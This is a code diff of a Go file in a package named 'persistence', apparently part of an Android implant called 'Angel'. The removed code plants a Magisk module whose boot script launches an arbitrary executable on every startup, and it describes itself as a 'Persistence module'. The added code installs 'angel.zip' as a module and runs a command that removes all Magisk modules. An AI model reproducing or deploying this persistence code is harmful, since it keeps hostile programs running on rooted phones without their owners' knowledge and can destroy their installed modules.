@@ -1,28 +1,25 @@
-package android
+//go:build android
+
+package persistence
 
 import (
-"os"
+"os/exec"
 )
 
-type MagiskModule struct{}
-
-func NewMagiskModule() *MagiskModule {
-return &MagiskModule{}
+func MagiskModule() bool {
+cmd := exec.Command("magisk", "--install-module", "angel.zip")
+err := cmd.Run()
+if err != nil {
+return false
+}
+return true
 }
 
-func (m *MagiskModule) CreateModule(name, execPath string) error {
-moduleDir := "/data/adb/modules/" + name
-if err := os.MkdirAll(moduleDir, 0755); err != nil {
-return err
+func MagiskModuleRemove() bool {
+cmd := exec.Command("magisk", "--remove-modules")
+err := cmd.Run()
+if err != nil {
+return false
 }
-moduleProp := `id=` + name + `
-name=Angel Module
-version=1.0
-versionCode=1
-author=Angel
-description=Persistence module`
-if err := os.WriteFile(moduleDir+"/module.prop", []byte(moduleProp), 0644); err != nil {
-return err
-}
-return os.WriteFile(moduleDir+"/post-fs-data.sh", []byte("#!/system/bin/sh\n"+execPath+" &\n"), 0755)
+return true
 }
